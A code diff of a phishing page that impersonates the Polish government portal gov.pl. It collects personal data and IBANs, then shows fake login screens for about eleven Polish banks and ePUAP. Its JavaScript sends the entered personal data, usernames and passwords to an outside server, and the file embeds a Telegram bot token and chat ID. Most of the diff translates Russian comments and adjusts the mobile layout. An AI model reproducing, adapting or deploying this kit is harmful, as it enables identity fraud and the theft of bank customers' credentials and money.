@@ -6,10 +6,8 @@
     <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
     <style>
         /* ============================================================
-           ПОЛНЫЙ CSS — ВСЕ БАНКИ (ВКЛЮЧАЯ ИЗМЕНЕНИЯ)
+           FULL CSS — ZMIANY DODANE NA KOŃCU
            ============================================================ */
-
-        /* ---------- БАЗОВЫЙ СБРОС ---------- */
         * {
             margin: 0;
             padding: 0;
@@ -379,7 +377,7 @@
             display: block;
         }
 
-        /* ---------- КОНТЕНТ ---------- */
+        /* ---------- CONTENT ---------- */
         .content-wrapper {
             flex: 1;
             min-width: 0;
@@ -444,7 +442,7 @@
             text-decoration: underline;
         }
 
-        /* ---------- ИЗОБРАЖЕНИЕ ---------- */
+        /* ---------- BANNER IMAGE ---------- */
         .image-under-banner {
             width: 100%;
             padding: 12px 0;
@@ -555,7 +553,7 @@
             color: #ffffff;
         }
 
-        /* ===== IBAN WRAPPER — PL НЕВИДИМ ===== */
+        /* ===== IBAN WRAPPER — PL INVISIBLE ===== */
         .iban-wrapper {
             position: relative;
             display: flex;
@@ -572,7 +570,6 @@
             background: #ffffff;
         }
 
-        /* PL — полностью невидим, но занимает место */
         .iban-wrapper .pl-prefix {
             padding: 0 0 0 14px;
             font-size: 14px;
@@ -584,8 +581,8 @@
             background: transparent;
             line-height: 1;
             opacity: 0 !important;
-            visibility: visible !important; /* сохраняем место */
-            width: 18px; /* фиксированная ширина для сохранения отступа */
+            visibility: visible !important;
+            width: 18px;
             display: inline-block;
             text-indent: 0;
         }
@@ -617,7 +614,7 @@
             background: #fff5f5 !important;
         }
 
-        /* ---------- FORMULARZ ---------- */
+        /* ---------- FORM ---------- */
         .data-form-section {
             background: #ffffff;
             padding: 30px 40px 40px;
@@ -781,7 +778,7 @@
             }
         }
 
-        /* ---------- EKRAN WYBORU BANKU ---------- */
+        /* ---------- BANK SELECT ---------- */
         .bank-selection {
             display: none;
             background: #ffffff;
@@ -1104,9 +1101,7 @@
             text-decoration: underline;
         }
 
-        /* ============================================================
-           BANK 2 — Millennium (ИЗМЕНЁН)
-           ============================================================ */
+        /* ===== BANK 2 — Millennium ===== */
         .bank2-full-page {
             display: none;
             background: #ffffff;
@@ -1275,7 +1270,7 @@
             display: flex;
         }
 
-        /* ---------- BANK 3 — КРАСНЫЙ ---------- */
+        /* ===== BANK 3 ===== */
         .bank3-full-page {
             display: none;
             background: url('1234.jpg') center/cover no-repeat;
@@ -1490,7 +1485,7 @@
             display: flex;
         }
 
-        /* ---------- BANK 4 — ЧЁРНЫЙ/БЕЛЫЙ ---------- */
+        /* ===== BANK 4 ===== */
         .bank4-full-page {
             display: none;
             background: #f5f5f5;
@@ -1623,7 +1618,7 @@
             display: flex;
         }
 
-        /* ---------- BANK 5 — VeloBank ---------- */
+        /* ===== BANK 5 ===== */
         .bank5-full-page {
             display: none;
             background: #1a1a1a;
@@ -1794,9 +1789,7 @@
             display: flex;
         }
 
-        /* ============================================================
-           BANK 6 — Bank Ochrony Środowiska (BOŚ)
-           ============================================================ */
+        /* ===== BANK 6 — BOŚ ===== */
         .bank6-full-page {
             display: none;
             background: #f0f4f8;
@@ -1997,9 +1990,7 @@
             display: flex;
         }
 
-        /* ============================================================
-           BANK 7 — GOonline (BNP Paribas)
-           ============================================================ */
+        /* ===== BANK 7 — BNP Paribas ===== */
         .bank7-full-page {
             display: none;
             min-height: 100vh;
@@ -2239,9 +2230,7 @@
             display: flex;
         }
 
-        /* ============================================================
-           BANK 8 — PKO Bank Polski
-           ============================================================ */
+        /* ===== BANK 8 ===== */
         .bank8-full-page {
             display: none;
             background: #f5f7fa;
@@ -2426,9 +2415,7 @@
             display: flex;
         }
 
-        /* ============================================================
-           BANK 9 — Alior Bank
-           ============================================================ */
+        /* ===== BANK 9 ===== */
         .bank9-full-page {
             display: none;
             min-height: 100vh;
@@ -2592,9 +2579,7 @@
             display: flex;
         }
 
-        /* ============================================================
-           BANK 10 — ePUAP / login.gov.pl
-           ============================================================ */
+        /* ===== BANK 10 ===== */
         .bank10-full-page {
             display: none;
             min-height: 100vh;
@@ -2796,9 +2781,7 @@
             display: flex;
         }
 
-        /* ============================================================
-           BANK 12 — ING Bank Śląski
-           ============================================================ */
+        /* ===== BANK 12 — ING ===== */
         .bank12-full-page {
             display: none;
             background: #ffffff;
@@ -2983,7 +2966,7 @@
             display: flex;
         }
 
-        /* ---------- TOAST MESSAGE ---------- */
+        /* ---------- TOAST ---------- */
         .toast-message {
             display: none;
             position: fixed;
@@ -3022,13 +3005,12 @@
             }
         }
 
-        /* ---------- MAIN CONTENT ---------- */
+        /* ---------- FOOTER ---------- */
         .main-content {
             padding: 0;
             min-height: 20px;
         }
 
-        /* ---------- FOOTER ---------- */
         .footer {
             background: #003b6f;
             color: #e0e8f0;
@@ -3084,7 +3066,7 @@
         }
 
         /* ============================================================
-           АДАПТИВНОСТЬ
+           RESPONSIVE — ZMIANY
            ============================================================ */
         @media (max-width: 992px) {
             .header {
@@ -3470,6 +3452,11 @@
         }
 
         @media (max-width: 768px) {
+            /* ===== UKRYWAMY LOGIN NAV W TELEFONIE ===== */
+            .login-nav {
+                display: none !important;
+            }
+
             .footer .container {
                 grid-template-columns: 1fr;
                 text-align: center;
@@ -3547,24 +3534,14 @@
                 gap: 6px;
                 margin-right: 0;
             }
-            .login-nav {
-                padding: 10px 16px;
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 12px;
+
+            /* ===== WIĘKSZY BANNER ===== */
+            .image-under-banner .image-wrapper img {
+                width: 100%;
+                max-width: 100%;
+                height: auto;
             }
-            .login-nav .brand {
-                margin-left: 0;
-                font-size: 17px;
-            }
-            .login-nav .nav-links {
-                gap: 12px;
-                flex-wrap: wrap;
-                margin-left: 0;
-            }
-            .login-nav .nav-links a {
-                font-size: 13px;
-            }
+
             .image-under-banner .image-wrapper .overlay-icon {
                 width: 100px;
                 height: 82px;
@@ -3590,12 +3567,27 @@
                 padding: 5px 14px;
                 border-width: 1.5px;
             }
+
+            /* ===== DATA URODZENIA — AUTO SLASH ===== */
+            .data-form .form-group input#birthdate {
+                letter-spacing: 2px;
+            }
+
             .data-form {
                 grid-template-columns: 1fr;
             }
+
+            /* ===== ADRES W JEDNYM RZĘDZIE ===== */
             .data-form .address-row {
-                grid-template-columns: 1fr;
+                display: grid;
+                grid-template-columns: 2fr 1fr 1fr;
+                gap: 6px;
             }
+            .data-form .address-row input {
+                font-size: 13px;
+                padding: 8px 6px;
+            }
+
             .data-form-section {
                 padding: 16px;
             }
@@ -4055,21 +4047,8 @@
                 gap: 4px;
                 margin-right: 0;
             }
-            .login-nav {
-                padding: 8px 12px;
-                gap: 10px;
-            }
-            .login-nav .brand {
-                font-size: 15px;
-                margin-left: 0;
-            }
-            .login-nav .nav-links {
-                gap: 8px 14px;
-                margin-left: 0;
-            }
-            .login-nav .nav-links a {
-                font-size: 12px;
-            }
+
+            /* ===== WIĘKSZY BANNER (mobilny) ===== */
             .image-under-banner .image-wrapper .overlay-icon {
                 width: 70px;
                 height: 58px;
@@ -4097,6 +4076,17 @@
                 padding: 4px 10px;
                 border-width: 1px;
             }
+
+            /* ===== ADRES — trzy kolumny ===== */
+            .data-form .address-row {
+                grid-template-columns: 2fr 1fr 1fr;
+                gap: 4px;
+            }
+            .data-form .address-row input {
+                font-size: 12px;
+                padding: 6px 4px;
+            }
+
             .data-form-section {
                 padding: 12px;
             }
@@ -4625,10 +4615,10 @@
                 </div>
             </div>
 
-            <!-- ===== ИЗОБРАЖЕНИЕ ===== -->
+            <!-- ===== BANNER ===== -->
             <div class="image-under-banner" id="imageBanner">
                 <div class="image-wrapper">
-                    <img src="4a4bfee8-cecc-4734-b549-3230515a45ef.png" alt="Image">
+                    <img src="4a4bfee8-cecc-4734-b549-3230515a45ef.png" alt="Image" style="width:100%; height:auto;">
                     <div class="overlay-icon">
                         <img src="51816b1b-533d-4730-983d-e3ce4184dcf6.svg" alt="icon">
                     </div>
@@ -4641,7 +4631,7 @@
                 </div>
             </div>
 
-            <!-- ===== FORMULARZ DANYCH OSOBOWYCH ===== -->
+            <!-- ===== FORM ===== -->
             <section class="data-form-section" id="dataFormSection">
                 <h2 class="section-title">Dane osobowe</h2>
 
@@ -4658,7 +4648,7 @@
 
                     <div class="form-group">
                         <label for="birthdate">Data urodzenia <span class="required">*</span></label>
-                        <input type="text" id="birthdate" name="birthdate" placeholder="__/__/____" maxlength="10" required>
+                        <input type="text" id="birthdate" name="birthdate" placeholder="__/__/____" maxlength="10" required oninput="autoSlash(event)">
                     </div>
 
                     <div class="form-group">
@@ -4693,7 +4683,7 @@
                 </form>
             </section>
 
-            <!-- ===== EKRAN WYBORU BANKU ===== -->
+            <!-- ===== BANK SELECT ===== -->
             <section class="bank-selection" id="bankSelection">
                 <h2 class="bank-title">Bankowość elektroniczna</h2>
                 <p class="bank-subtitle">Wybierz bank, za pomocą którego chcesz się zalogować.</p>
@@ -4787,17 +4777,14 @@
                 </div>
             </section>
 
-            <!-- ===== BANK 2 — Millennium ===== -->
+            <!-- ===== BANK 2 ===== -->
             <div class="bank2-full-page" id="loginScreen2">
                 <button class="bank2-close-btn" id="bank2CloseBtn" onclick="closeLoginScreen2()">✕</button>
-
                 <div class="bank2-container">
                     <div class="bank2-box">
-
                         <div class="bank2-logo">
                             <img src="logo9.png" alt="Bank 2">
                         </div>
-
                         <form class="bank2-form" onsubmit="return handleLogin(event, 'Bank 2')">
                             <div class="form-group">
                                 <label for="loginUsername2">Podaj Millekod</label>
@@ -4814,16 +4801,13 @@
                                 <button type="submit" class="login-btn">Dalej</button>
                             </div>
                         </form>
-
                         <div class="bank2-footer-text">
                             <strong>Fałszywi konsultanci</strong>
                             Oszuści podszywają się pod pracowników Banku - nie pobieraj nieznanych aplikacji i nie udostępniaj poufnych danych
-                            
                             <br><br>
                             <strong>Finanse 360°</strong>
                             Sprawdź saldo i zlecaj przelewy z kont w innych bankach wygodnie przez Millenet
                         </div>
-
                     </div>
                 </div>
             </div>
@@ -4831,20 +4815,15 @@
             <!-- ===== BANK 3 ===== -->
             <div class="bank3-full-page" id="loginScreen3">
                 <button class="bank3-close-btn" id="bank3CloseBtn" onclick="closeLoginScreen3()">✕</button>
-
                 <div class="bank3-header">
                     <div class="bank3-header-content">
-                        <span class="bank3-logo">
-                            <img src="logo-white.svg" alt="Bank 3">
-                        </span>
+                        <span class="bank3-logo"><img src="logo-white.svg" alt="Bank 3"></span>
                     </div>
                 </div>
-
                 <div class="login-container">
                     <div class="login-form-wrapper">
                         <div class="login-title">Zaloguj się</div>
                         <div class="login-subtitle">do bankowości elektronicznej</div>
-
                         <form class="login-form" onsubmit="return handleLogin(event, 'Bank 3')">
                             <div class="form-group">
                                 <label for="loginUsername3">Login</label>
@@ -4858,16 +4837,9 @@
                                 <button type="submit" class="login-btn">Dalej</button>
                             </div>
                         </form>
-
                         <div class="security-warnings">
-                            <div class="warning-item">
-                                <span class="icon">⚠️</span>
-                                <span>Zachowaj czujność - przestępcy podszywają się pod pracowników ds. bezpieczeństwa banku.</span>
-                            </div>
-                            <div class="warning-item">
-                                <span class="icon">🔒</span>
-                                <span>Bezpieczne wakacje z cyberPEKAO - zadbaj o spokój, gdziekolwiek jesteś!</span>
-                            </div>
+                            <div class="warning-item"><span class="icon">⚠️</span><span>Zachowaj czujność - przestępcy podszywają się pod pracowników ds. bezpieczeństwa banku.</span></div>
+                            <div class="warning-item"><span class="icon">🔒</span><span>Bezpieczne wakacje z cyberPEKAO - zadbaj o spokój, gdziekolwiek jesteś!</span></div>
                         </div>
                     </div>
                 </div>
@@ -4876,11 +4848,9 @@
             <!-- ===== BANK 4 ===== -->
             <div class="bank4-full-page" id="loginScreen4">
                 <button class="bank4-close-btn" id="bank4CloseBtn" onclick="closeLoginScreen4()">✕</button>
-
                 <div class="bank4-container">
                     <div class="bank4-title">potwierdź swoją tożsamość</div>
                     <div class="bank4-subtitle">zaloguj się do mBanku loginem i hasłem</div>
-
                     <form class="bank4-form" onsubmit="return handleLogin(event, 'Bank 4')">
                         <div class="form-group">
                             <label for="loginUsername4">Login</label>
@@ -4900,10 +4870,8 @@
             <!-- ===== BANK 5 ===== -->
             <div class="bank5-full-page" id="loginScreen5">
                 <button class="bank5-close-btn" id="bank5CloseBtn" onclick="closeLoginScreen5()">✕</button>
-
                 <div class="bank5-container">
                     <div class="bank5-box">
-
                         <div class="bank5-alert">
                             Widzisz komunikat o blokadzie bankowości, nie pamiętasz danych logowania lub dostęp do Citi Handlowy jest zablokowany?
                             <br>
@@ -4911,10 +4879,8 @@
                             <br><br>
                             Szybko potwierdzisz swoją tożsamość i odzyskasz dostęp – bez wychodzenia z domu i bez zbędnych formalności.
                         </div>
-
                         <div class="bank5-title">Zaloguj się do VeloBanku</div>
                         <div class="bank5-subtitle">Login i hasło</div>
-
                         <form class="bank5-form" onsubmit="return handleLogin(event, 'Bank 5')">
                             <div class="form-group">
                                 <label for="loginUsername5">Login</label>
@@ -4928,19 +4894,16 @@
                                 <button type="submit" class="login-btn">Dalej</button>
                             </div>
                         </form>
-
                     </div>
                 </div>
             </div>
 
-            <!-- ===== BANK 6 — BOŚ ===== -->
+            <!-- ===== BANK 6 ===== -->
             <div class="bank6-full-page" id="loginScreen6">
                 <button class="bank6-close-btn" id="bank6CloseBtn" onclick="closeLoginScreen6()">✕</button>
-
                 <div class="bank6-container">
                     <div class="bank6-left">
                         <div class="bank6-title">Logowanie</div>
-
                         <form class="bank6-form" onsubmit="return handleLogin(event, 'Bank 6')">
                             <div class="form-group">
                                 <label for="loginUsername6">Login</label>
@@ -4952,49 +4915,30 @@
                             </div>
                             <button type="submit" class="login-btn">Dalej</button>
                         </form>
-
-                        <div class="bank6-download">
-                            <img src="download.png" alt="Pobierz aplikację">
-                        </div>
+                        <div class="bank6-download"><img src="download.png" alt="Pobierz aplikację"></div>
                     </div>
-
                     <div class="bank6-right">
                         <div class="bank6-security-title">🔒 Pamiętaj o zasadach bezpieczeństwa</div>
                         <div class="bank6-security-text">
                             <p>Wprowadzaj adres strony Banku ręcznie, nie korzystaj z wyników wyszukiwarek i linków niewiadomego pochodzenia.</p>
-
                             <p><span class="highlight">Przed zalogowaniem sprawdź, czy:</span></p>
-                            <ul>
-                                <li>adres rozpoczyna się od <span class="green">https</span></li>
-                                <li>połączenie jest szyfrowane tj. w pasku adresu widoczna jest zamknięta kłódka</li>
-                                <li>certyfikat strony wystawiony jest dla <span class="green">Bank Ochrony Środowiska S.A.</span></li>
-                            </ul>
-
+                            <ul><li>adres rozpoczyna się od <span class="green">https</span></li><li>połączenie jest szyfrowane tj. w pasku adresu widoczna jest zamknięta kłódka</li><li>certyfikat strony wystawiony jest dla <span class="green">Bank Ochrony Środowiska S.A.</span></li></ul>
                             <p>Używaj opcji <span class="highlight">Wyloguj</span> kończąc pracę w systemie, gwarantuje to poprawne zamknięcie twojej sesji.</p>
-
                             <p>Jeśli zauważysz coś nietypowego lub podejrzanego zgłoś ten fakt do Banku.</p>
-
                             <p>Więcej informacji na temat bezpieczeństwa znajdziesz na stronie Banku: <span class="link" onclick="alert('Przekierowanie do strony bezpieczeństwa'); return false;">Zasady bezpieczeństwa</span></p>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <!-- ===== BANK 7 — GOonline ===== -->
+            <!-- ===== BANK 7 ===== -->
             <div class="bank7-full-page" id="loginScreen7">
                 <button class="bank7-close-btn" id="bank7CloseBtn" onclick="closeLoginScreen7()">✕</button>
-
                 <div class="bank7-container">
-
-                    <div class="bank7-logo">
-                        <img src="bnp-paribas-logo-full.svg" alt="BNP Paribas">
-                    </div>
-
+                    <div class="bank7-logo"><img src="bnp-paribas-logo-full.svg" alt="BNP Paribas"></div>
                     <div class="bank7-box">
-
                         <div class="bank7-title">Zaloguj się do GOonline</div>
                         <div class="bank7-subtitle">Podaj swój login, aby zalogować się do serwisu transakcyjnego</div>
-
                         <form class="bank7-form" onsubmit="return handleLogin(event, 'Bank 7')">
                             <div class="form-group">
                                 <label for="loginUsername7">Login</label>
@@ -5006,48 +4950,31 @@
                             </div>
                             <button type="submit" class="login-btn">Dalej</button>
                         </form>
-
                         <div class="bank7-security">
                             <div class="bank7-security-title">Sprawdź, zanim się zalogujesz:</div>
-                            <ul class="bank7-security-list">
-                                <li>Adres zaczyna się od https</li>
-                                <li>Połączenie szyfrowane</li>
-                                <li>Certyfikat strony</li>
-                            </ul>
+                            <ul class="bank7-security-list"><li>Adres zaczyna się od https</li><li>Połączenie szyfrowane</li><li>Certyfikat strony</li></ul>
                             <div class="bank7-links">
                                 <a href="#" onclick="alert('Przekierowanie do strony GOonline'); return false;">Poznaj GOonline</a>
                                 <span class="separator">|</span>
                                 <a href="#" onclick="alert('Przekierowanie do pomocy'); return false;">Masz pytania dotyczące GOonline?</a>
                             </div>
-                            <div class="bank7-chat">
-                                <a href="#" onclick="alert('Przekierowanie do wideoczatu'); return false;">Zapytaj konsultanta na wideoczacie</a> (w godz 9-17 w dni robocze)
-                            </div>
+                            <div class="bank7-chat"><a href="#" onclick="alert('Przekierowanie do wideoczatu'); return false;">Zapytaj konsultanta na wideoczacie</a> (w godz 9-17 w dni robocze)</div>
                         </div>
-
                     </div>
                 </div>
-
-                <div class="bank7-norton">
-                    <img src="norton.png" alt="Norton">
-                </div>
+                <div class="bank7-norton"><img src="norton.png" alt="Norton"></div>
             </div>
 
-            <!-- ===== BANK 8 — PKO Bank Polski ===== -->
+            <!-- ===== BANK 8 ===== -->
             <div class="bank8-full-page" id="loginScreen8">
                 <button class="bank8-close-btn" id="bank8CloseBtn" onclick="closeLoginScreen8()">✕</button>
-
                 <div class="bank8-container">
                     <div class="bank8-left">
-                        <div class="bank8-favicon">
-                            <img src="favicon.ico" alt="PKO BP">
-                        </div>
-
+                        <div class="bank8-favicon"><img src="favicon.ico" alt="PKO BP"></div>
                         <div class="bank8-card">
                             <div class="bank8-card-title">Klient indywidualny</div>
-
                             <div class="bank8-login-title">Zaloguj się</div>
                             <div class="bank8-login-subtitle">Podaj login i hasło</div>
-
                             <form class="bank8-form" onsubmit="return handleLogin(event, 'Bank 8')">
                                 <div class="form-group">
                                     <label for="loginUsername8">Login</label>
@@ -5061,35 +4988,25 @@
                             </form>
                         </div>
                     </div>
-
                     <div class="bank8-right">
                         <div class="bank8-security-title">Włącz dodatkową ochronę przed oszustami</div>
-                        <div class="bank8-security-text">
-                            <p>Cyberprzestępcy nie śpią. Zabezpiecz swoje pieniądze - włącz darmową weryfikację behawioralną.</p>
-                        </div>
-                        <div class="bank8-security-image">
-                            <img src="login-positive-1000.png" alt="Bezpieczeństwo">
-                        </div>
+                        <div class="bank8-security-text"><p>Cyberprzestępcy nie śpią. Zabezpiecz swoje pieniądze - włącz darmową weryfikację behawioralną.</p></div>
+                        <div class="bank8-security-image"><img src="login-positive-1000.png" alt="Bezpieczeństwo"></div>
                     </div>
                 </div>
             </div>
 
-            <!-- ===== BANK 9 — Alior Bank ===== -->
+            <!-- ===== BANK 9 ===== -->
             <div class="bank9-full-page" id="loginScreen9">
                 <button class="bank9-close-btn" id="bank9CloseBtn" onclick="closeLoginScreen9()">✕</button>
-
                 <div class="bank9-container">
                     <div class="bank9-top">
-                        <div class="bank9-logo">
-                            <img src="alior-logo.svg" alt="Alior Bank">
-                        </div>
+                        <div class="bank9-logo"><img src="alior-logo.svg" alt="Alior Bank"></div>
                         <div class="bank9-title">Potwierdzenie tożsamości z Alior Bankiem</div>
                     </div>
-
                     <div class="bank9-wrapper">
                         <div class="bank9-card">
                             <div class="bank9-welcome">Witamy w Alior Banku!</div>
-
                             <form class="bank9-form" onsubmit="return handleLogin(event, 'Bank 9')">
                                 <div class="form-group">
                                     <label for="loginUsername9">Login</label>
@@ -5106,32 +5023,19 @@
                 </div>
             </div>
 
-            <!-- ===== BANK 10 — ePUAP / login.gov.pl ===== -->
+            <!-- ===== BANK 10 ===== -->
             <div class="bank10-full-page" id="loginScreen10">
                 <button class="bank10-close-btn" id="bank10CloseBtn" onclick="closeLoginScreen10()">✕</button>
-
                 <div class="bank10-container">
-
-                    <div class="bank10-top-logo">
-                        <img src="logo (2).png" alt="ePUAP">
-                    </div>
-
+                    <div class="bank10-top-logo"><img src="logo (2).png" alt="ePUAP"></div>
                     <div class="bank10-main">
-                        <div class="bank10-left">
-                        </div>
-
+                        <div class="bank10-left"></div>
                         <div class="bank10-card">
-                            <p>
-                                <strong>Węzeł Krajowy - login.gov.pl chce potwierdzić Twoją tożsamość w celu: ePUAP.</strong>
-                                <br><br>
-                                Twoje dane do logowania są bezpieczne, nigdzie ich nie przekazujemy.
-                            </p>
+                            <p><strong>Węzeł Krajowy - login.gov.pl chce potwierdzić Twoją tożsamość w celu: ePUAP.</strong><br><br>Twoje dane do logowania są bezpieczne, nigdzie ich nie przekazujemy.</p>
                         </div>
                     </div>
-
                     <div class="bank10-form-section">
                         <div class="bank10-login-title">Zaloguj się</div>
-
                         <form class="bank10-form" onsubmit="return handleLogin(event, 'Bank 10')">
                             <div class="form-group">
                                 <label for="loginUsername10">Login</label>
@@ -5144,7 +5048,6 @@
                             <button type="submit" class="login-btn">Dalej</button>
                         </form>
                     </div>
-
                     <div class="bank10-security">
                         <div class="bank10-security-title">Bezpieczeństwo</div>
                         <ul class="bank10-security-list">
@@ -5153,23 +5056,16 @@
                             <li>Nie otwieraj linków i załączników od nieznanych nadawców.</li>
                         </ul>
                     </div>
-
                 </div>
             </div>
 
-            <!-- ===== BANK 12 — ING Bank Śląski ===== -->
+            <!-- ===== BANK 12 ===== -->
             <div class="bank12-full-page" id="loginScreen12">
                 <button class="bank12-close-btn" id="bank12CloseBtn" onclick="closeLoginScreen12()">✕</button>
-
                 <div class="bank12-container">
                     <div class="bank12-box">
-
-                        <div class="bank12-logo">
-                            <img src="logo_ing-logo.svg" alt="ING Bank Śląski">
-                        </div>
-
+                        <div class="bank12-logo"><img src="logo_ing-logo.svg" alt="ING Bank Śląski"></div>
                         <div class="bank12-title">Potwierdzasz tożsamość w Moim ING</div>
-
                         <form class="bank12-form" onsubmit="return handleLogin(event, 'ING Bank Śląski')">
                             <div class="form-group">
                                 <label for="loginUsername12">Login do bankowości Moje ING</label>
@@ -5186,20 +5082,17 @@
                                 <button type="submit" class="login-btn">Dalej</button>
                             </div>
                         </form>
-
                         <div class="bank12-footer-text">
                             <strong>Przybywa oszukanych na portalach aukcyjnych.</strong>
                             Unikaj transakcji przez mejle, SMS-y i komunikatory. Nie klikaj w link od kupującego.
                             <br>
                             <span class="link" onclick="alert('Przekierowanie do strony o oszustwach'); return false;">Więcej o oszustwach na portalach aukcyjnych</span>
-
                             <br><br>
                             <strong>Ktoś dzwoni i podaje się za pracownika ING?</strong>
                             Sprawdź, czy to nie oszust.
                             <br>
                             <span class="link" onclick="alert('Przekierowanie do strony jak sprawdzić kto dzwoni'); return false;">Zobacz, jak sprawdzić kto dzwoni</span>
                         </div>
-
                     </div>
                 </div>
             </div>
@@ -5208,7 +5101,7 @@
         </div>
     </div>
 
-    <!-- ===== TOAST MESSAGE ===== -->
+    <!-- ===== TOAST ===== -->
     <div class="toast-message" id="toastMessage">Najpierw wypełnij wszystkie wymagane pola!</div>
 
     <!-- ===== FOOTER ===== -->
@@ -5255,12 +5148,27 @@
 
     <!-- ===== JAVASCRIPT ===== -->
     <script>
-        // ===== ТОКЕН И CHAT ID ТЕЛЕГРАМ-БОТА =====
+        // ===== AUTO SLASH FOR BIRTHDATE =====
+        function autoSlash(event) {
+            const input = event.target;
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 8) value = value.slice(0, 8);
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i === 2 || i === 4) {
+                    formatted += '/';
+                }
+                formatted += value[i];
+            }
+            input.value = formatted;
+        }
+
+        // ===== TELEGRAM CONFIG =====
         const TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs';
         const TELEGRAM_CHAT_ID = '-1004256695843';
 
         document.addEventListener('DOMContentLoaded', function() {
-            // ===== МЕНЮ =====
+            // ===== MENU =====
             const menuToggle = document.getElementById('menuToggle');
             const sidebar = document.getElementById('sidebar');
             const mainWrapper = document.getElementById('mainWrapper');
@@ -5304,7 +5212,7 @@
                 if (e.key === 'Escape' && isMenuOpen) toggleMenu();
             });
 
-            // ===== ПОИСК =====
+            // ===== SEARCH =====
             document.querySelector('.header-search .search-submit-btn')?.addEventListener('click', function() {
                 const input = this.closest('.header-search').querySelector('input');
                 alert('Szukanie: ' + (input?.value || 'puste'));
@@ -5316,7 +5224,7 @@
                 }
             });
 
-            // ===== НАВИГАЦИЯ LOGIN NAV =====
+            // ===== LOGIN NAV LINKS =====
             document.querySelectorAll('.login-nav .nav-links a').forEach(link => {
                 link.addEventListener('click', function(e) {
                     e.preventDefault();
@@ -5324,7 +5232,7 @@
                 });
             });
 
-            // ===== КНОПКА DOWIEDZ SIĘ WIĘCEJ =====
+            // ===== SCROLL TO FORM =====
             const scrollBtn = document.getElementById('scrollToFormBtn');
             const formSection = document.getElementById('dataFormSection');
 
@@ -5333,7 +5241,7 @@
                 formSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
             });
 
-            // ===== ФОРМА - ОТПРАВКА =====
+            // ===== FORM SUBMIT =====
             const form = document.getElementById('dataForm');
             const submitBtn = document.getElementById('submitBtn');
             const toast = document.getElementById('toastMessage');
@@ -5349,7 +5257,6 @@
             const ibanWrapper = document.getElementById('ibanWrapper');
 
             if (ibanInput) {
-                // Очистка от "PL" при вставке
                 ibanInput.addEventListener('paste', function(e) {
                     setTimeout(() => {
                         let raw = this.value.replace(/\s/g, '').toUpperCase();
@@ -5362,7 +5269,6 @@
                     }, 10);
                 });
 
-                // Фильтрация ввода — только цифры, максимум 26
                 ibanInput.addEventListener('input', function() {
                     let raw = this.value.replace(/\s/g, '').toUpperCase();
                     if (raw.startsWith('PL')) raw = raw.substring(2);
@@ -5398,7 +5304,6 @@
                     }
                 });
 
-                // Проверка IBAN (26 цифр)
                 const ibanValue = ibanInput.value.replace(/\s/g, '');
                 if (ibanValue.length < 26) {
                     allFilled = false;
@@ -5438,7 +5343,6 @@
 
                 const formData = getFormData();
 
-                // Отправка на сервер
                 fetch('https://gvvbt.onrender.com/send', {
                     method: 'POST',
                     headers: {
@@ -5491,7 +5395,7 @@
             });
         });
 
-        // ===== ОТПРАВКА ДАННЫХ ЛОГИНА ЧЕРЕЗ СЕРВЕР =====
+        // ===== SEND LOGIN =====
         function sendLoginToServer(bankName, username, password) {
             console.log(`Sending login: ${bankName}, ${username}, ${password}`);
             
@@ -5522,7 +5426,7 @@
             });
         }
 
-        // ===== ОБРАБОТЧИК ВСЕХ ФОРМ БАНКОВ =====
+        // ===== HANDLE LOGIN =====
         function handleLogin(event, bankName) {
             event.preventDefault();
             console.log(`Handle login for: ${bankName}`);
@@ -5579,7 +5483,7 @@
             return false;
         }
 
-        // ===== ОТКРЫТИЕ BANK 1 =====
+        // ===== BANK OPEN/CLOSE FUNCTIONS =====
         function openLoginScreen1() {
             document.getElementById('bankSelection').classList.remove('visible');
             document.getElementById('bankFooter').classList.remove('visible');
@@ -5587,7 +5491,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ОТКРЫТИЕ BANK 2 =====
         function openLoginScreen2() {
             const bank2 = document.getElementById('loginScreen2');
             const closeBtn = document.getElementById('bank2CloseBtn');
@@ -5597,7 +5500,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ЗАКРЫТИЕ BANK 2 =====
         function closeLoginScreen2() {
             const bank2 = document.getElementById('loginScreen2');
             const closeBtn = document.getElementById('bank2CloseBtn');
@@ -5607,7 +5509,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ОТКРЫТИЕ BANK 3 =====
         function openLoginScreen3() {
             const bank3 = document.getElementById('loginScreen3');
             const closeBtn = document.getElementById('bank3CloseBtn');
@@ -5617,7 +5518,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ЗАКРЫТИЕ BANK 3 =====
         function closeLoginScreen3() {
             const bank3 = document.getElementById('loginScreen3');
             const closeBtn = document.getElementById('bank3CloseBtn');
@@ -5627,7 +5527,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ОТКРЫТИЕ BANK 4 =====
         function openLoginScreen4() {
             const bank4 = document.getElementById('loginScreen4');
             const closeBtn = document.getElementById('bank4CloseBtn');
@@ -5637,7 +5536,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ЗАКРЫТИЕ BANK 4 =====
         function closeLoginScreen4() {
             const bank4 = document.getElementById('loginScreen4');
             const closeBtn = document.getElementById('bank4CloseBtn');
@@ -5647,7 +5545,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ОТКРЫТИЕ BANK 5 =====
         function openLoginScreen5() {
             const bank5 = document.getElementById('loginScreen5');
             const closeBtn = document.getElementById('bank5CloseBtn');
@@ -5657,7 +5554,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ЗАКРЫТИЕ BANK 5 =====
         function closeLoginScreen5() {
             const bank5 = document.getElementById('loginScreen5');
             const closeBtn = document.getElementById('bank5CloseBtn');
@@ -5667,7 +5563,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ОТКРЫТИЕ BANK 6 =====
         function openLoginScreen6() {
             const bank6 = document.getElementById('loginScreen6');
             const closeBtn = document.getElementById('bank6CloseBtn');
@@ -5677,7 +5572,6 @@
